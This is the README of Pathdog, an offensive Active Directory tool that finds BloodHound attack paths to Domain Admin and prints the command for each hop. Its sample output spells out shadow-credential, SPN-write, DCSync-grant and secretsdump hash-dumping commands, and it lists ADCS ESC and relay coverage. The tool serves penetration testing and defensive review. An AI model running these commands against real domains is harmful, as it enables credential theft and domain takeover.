# Pathdog

Parse a BloodHound ZIP export, find attack paths to Domain Admin, triage
domain-wide findings, and print the exact commands to run at every hop.
No Neo4j, no GUI, no depth limit.

## Install

```bash
git clone https://github.com/Dikabraxis/Pathdog.git
cd Pathdog
pip install -r requirements.txt
```

Python 3.10+.

## Usage

```
python3 pathdog.py -z <dump.zip> -u <user> [options]
```

`-u` is required for attack-path mode. It is not required when using
`--triage`, `--node`, or `--list`.

| Flag | Description |
|------|-------------|
| `-z FILE` | BloodHound ZIP export(s). Multiple ZIPs are merged. |
| `-u USER` | Owned user(s). Accepts `name@domain.local` or a `.txt` file. |
| `-t TARGET` | Target node. Defaults to auto-detected `DOMAIN ADMINS`. |
| `-k N` | Number of paths per user (default `3`). |
| `-o BASENAME` | Output base name (default `pathdog_report`). |
| `-f md \| html \| both` | Report format (default `html`). Pass `md` or `both` to also produce a Markdown report. |
| `-l KIND` | List nodes and exit. Omit `KIND` to list all nodes. `KIND` = `users`, `computers`, `groups`, `domains`, `gpos`, `ous`, `containers`, `certtemplates`, `enterprisecas`, `rootcas`, `aiacas`, `ntauthstores`, `all`. |
| `-v` | Show graph statistics. |
| `--triage` | Add global prioritized triage. Can run alone or combine with `-u` / `--node`. |
| `--export-json [FILE]` | Write a structured JSON report. Defaults to `<output>.json`. |
| `--node NODE` | 360° visibility on a node, what it can reach (outbound) and who can reach it (inbound). No `-u` required. Combines with `-u` into a single HTML. |
| `--no-fallback` | Disable intermediate-target suggestions. |
| `--no-quickwins` | Disable the domain-wide quick-wins scan. |
| `--no-pivots` | Disable pivot-candidate scan. |
| `--fallback-top N` | Cap intermediate targets per user (default `10`). |
| `--pivots-top N` | Cap pivot candidates (default `15`). |

## Examples

```bash
# Basic, find paths from a single owned user
python3 pathdog.py -z corp.zip -u john.doe@corp.local

# Multiple ZIPs, multiple users (paths can cross-chain between them)
python3 pathdog.py -z dump1.zip dump2.zip -u alice@corp.local bob@corp.local

# Owned users from a text file (lines starting with # are ignored)
python3 pathdog.py -z corp.zip -u owned.txt -k 5 -f html -v

# Target a computer instead of DA
python3 pathdog.py -z corp.zip -u alice@corp.local -t DC01.corp.local

# Just inspect the dump without running pathfinding
python3 pathdog.py -z corp.zip --list users
python3 pathdog.py -z corp.zip --list all

# Global triage without an owned user
python3 pathdog.py -z corp.zip --triage --export-json

# 360° visibility on a node, what it can reach and who can reach it
python3 pathdog.py -z corp.zip --node svc_backup@corp.local

# Combine -u and --node, single HTML with both sections
python3 pathdog.py -z corp.zip -u john.doe@corp.local --node svc_backup@corp.local -f html

# Add triage only when you want dump-wide findings in the same report
python3 pathdog.py -z corp.zip -u john.doe@corp.local --triage -f html
python3 pathdog.py -z corp.zip --node svc_backup@corp.local --triage -f html
```

## What you get

For each owned user, Pathdog produces a console summary plus the requested
Markdown and/or HTML report. Plain `-u` reports stay focused on owned-user
paths; dump-wide triage sections appear only when `--triage` is also present.
The HTML report shows:

- **One-line verdict** at the top, path found, no path but pivot available,
  or nothing actionable.
- **Best path** with an ASCII chain overview, then each hop as a card with
  a plain-English title, what it means, the impact, and the exact commands
  to run as the current identity.
- **Pivot candidates** when no direct path exists, principals that already
  have a path to the target and can be compromised out-of-band (Kerberoast,
  AS-REP roast, weak password, LAPS, unconstrained delegation).
- **Prioritized findings** with severity, evidence, source, and commands
  when `--triage` is requested and the graph contains actionable attack edges
  or domain-wide quick wins.
- **Domain-wide quick-wins** when `--triage` is requested, surfaced from
  BloodHound node properties:
  AS-REP roastables, Kerberoastables, unconstrained delegation, LAPS-
  deployed hosts, ADCS templates, password-not-required accounts, DCs.
- **Identity tracking**, commands at each hop use the identity you have
  *right now*, not the node label in the graph.

### Triage mode (`--triage`)

Use `--triage` when you want a fast dump-wide view without declaring owned
users. Pathdog builds normalized findings from quick wins and graph edges,
then ranks them by severity. This is useful for first-pass review, report
generation, or deciding which owned user to test next.

```bash
python3 pathdog.py -z corp.zip --triage -f both --export-json
```

Example console output:

```
[*] Loading corp.zip ...
    → 18421 nodes, 76210 edges
[*] Building graph ...
[*] Graph: 18421 unique nodes, 75104 unique edges
[*] Triage target context: S-1-5-21-...-512

  ◆ Prioritized findings:
      • [10] ADCS ADCSESC1: ADCSESC1 on UserTemplate@corp.local — UserTemplate@corp.local
      • [10] DCSync: svc_sync@corp.local can DCSync corp.local — corp.local
      • [9] Dangerous ACL: Helpdesk@corp.local has WriteDacl on high-value DOMAIN ADMINS@corp.local — DOMAIN ADMINS@corp.local
      • [8] Password not required: Password not required: legacy@corp.local — legacy@corp.local
      • [8] Unconstrained delegation: Unconstrained delegation: APP01.corp.local — APP01.corp.local
      • [6] AS-REP roast: AS-REP roast: oldsvc@corp.local — oldsvc@corp.local
      • [6] Kerberoast: Kerberoast: svc_sql@corp.local — svc_sql@corp.local
      • [5] LAPS in use: LAPS in use: WS042.corp.local — WS042.corp.local
      • [4] High-value target: High-value target: DOMAIN ADMINS@corp.local — DOMAIN ADMINS@corp.local

  ◆ Domain quick-wins:
      • High-value target (12)
      • Kerberoast (4)
      • AS-REP roast (2)
      • Unconstrained delegation (1)
      • ADCS ADCSESC1 (1)
    full details + commands  →  see HTML report

[+] Report(s) written: pathdog_report.md, pathdog_report.html, pathdog_report.json
```

The JSON export contains graph stats, findings, quick wins, pivots, owned
results, path nodes/edges, weights, relations, and node-visibility data when
`--node` is used.

### ADCS / ESC coverage

Pathdog understands BloodHound ADCS edges and produces Certipy-oriented
commands for:

- `ADCSESC1`, `ADCSESC3`, `ADCSESC4`
- `ADCSESC6a`, `ADCSESC6b`
- `ADCSESC9a`, `ADCSESC9b`
- `ADCSESC10a`, `ADCSESC10b`
- `ADCSESC13`
- `GoldenCert`
- coercion/relay edges:
  `CoerceAndRelayNTLMToSMB`, `CoerceAndRelayNTLMToLDAP`,
  `CoerceAndRelayNTLMToLDAPS`, `CoerceAndRelayNTLMToADCS`
- supporting rights such as `Enroll`, `AutoEnroll`, `ManageCA`,
  `ManageCertificates`, `DelegatedEnrollmentAgent`,
  `WritePKINameFlag`, and `WritePKIEnrollmentFlag`

ADCS object kinds such as certificate templates, enterprise CAs, root CAs,
AIA CAs, and NTAuth stores are recognized when present in the dump.

### Node visibility (`--node`)

Use `--node` to get a 360° picture of any node without targeting Domain
Admins. The HTML report contains:

- **Attack paths**, outbound chains from this node to DA (or `-t TARGET`),
  with the same per-hop command breakdown as `-u`.
- **Other reachable high-value targets** (collapsible), interesting
  intermediate nodes this node can reach, useful as pivot steps even when
  no direct DA path exists.
- **Inbound attackers** (collapsible), principals with a full attack path
  *leading to* this node, ranked by how exploitable they are.
- **Outbound object control** (collapsible), every object this node has
  privileges over, directly or through group membership.
- **Inbound object control** (collapsible), principals with direct
  privileges over this node.

Standalone `--node` reports stay focused on node visibility. Add `--triage`
when you also want domain-wide findings and quick-wins in the same report, or
combine `-u` with `--node` when you want attack paths and node visibility
together.

When you pass both `-u` and `--node`, Pathdog produces a single combined
HTML with the `-u` section on top (green banner) and the `--node` section
below (purple banner), separated by a clear divider.

Example console output (best path + summary; full breakdown lives in the HTML report):

```
  ✓ john.doe@acme.local → DOMAIN ADMINS@acme.local   5 hops, weight 8 [DCSync]

    john.doe@acme.local
      └─[MemberOf]──► HELPDESK@acme.local
      └─[GenericWrite]──► svc_backup@acme.local
      └─[WriteDacl]──► acme.local
      └─[Contains]──► USERS@acme.local
      └─[Contains]──► DOMAIN ADMINS@acme.local

    # Step 1: GenericWrite on svc_backup@acme.local  (as john.doe@acme.local)
      $ pywhisker -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add --dc-ip <DC_IP>
      $ bloodyAD --host <DC_IP> -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' set object 'svc_backup' servicePrincipalName -v 'fake/blah'
      → now operating as: svc_backup@acme.local

    # Step 2: WriteDacl on acme.local  (as svc_backup@acme.local)
      $ dacledit.py -action write -rights DCSync -principal 'svc_backup' -target-dn 'DC=acme,DC=local' 'acme.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
      # PowerView (TargetIdentity = domain DN):
      $ Add-DomainObjectAcl -TargetIdentity 'DC=acme,DC=local' -PrincipalIdentity 'svc_backup' -Rights DCSync -Credential $Cred
      # Then dump all hashes:
      $ impacket-secretsdump -just-dc 'acme.local/svc_backup:<SRC_PASSWORD>@<DC_IP>'

    +2 more paths  →  see HTML report
    10 intermediate target(s) reachable  →  see HTML report

  ◆ Best pivot: db_admin@acme.local (Kerberoast, 3 hops onward)

  ◆ Domain quick-wins:
      • High-value target (12)
      • Kerberoast (4)
      • AS-REP roast (2)
      • Unconstrained delegation (1)
      • Domain Controller (2)
    full details + commands  →  see HTML report
```

Example console output for `--node` (visibility on a single node):

```
  Node: john.doe@acme.local (users)  [PasswordNotReqd]
  ───────────────────────────────────────────────────────

  → OUTBOUND CONTROL  2 direct, 0 via group(s)
    • CanPSRemote on DC.acme.local
      +1 more privilege(s)  →  see HTML report

  ← INBOUND CONTROL  6 principal(s) have privileges over this node
    • KEY ADMINS@acme.local [AddKeyCredentialLink]
      +5 more  →  see HTML report

  → ATTACK PATHS  outbound to DOMAIN ADMINS@acme.local
    ✓ 5 hops, weight 14
      +2 more paths  →  see HTML report

  ← INBOUND ATTACKERS  who can reach john.doe@acme.local
    ! 10 principal(s), closest: administrator@acme.local (2 hops)
      full list  →  see HTML report
```

ANSI colors are emitted when stdout is a TTY, auto-disabled by `NO_COLOR=1`,
and can be forced in captured output with `FORCE_COLOR=1`.

## Notes

- Both BloodHound legacy (v4) and BloodHound CE (v5+) ZIP formats are
  supported.
- Multiple ZIPs are merged into a single graph before pathfinding,
  duplicate nodes and edges are deduplicated automatically.
- Pathdog synthesizes a `DCSync` edge when a principal holds both
  `GetChanges` and `GetChangesAll` on the same domain. Either right alone
  is deprioritized (it isn't exploitable without the pair).
- Tests use small synthetic BloodHound ZIPs and run with the Python standard
  library test runner: `python3 -m unittest discover -s tests`.
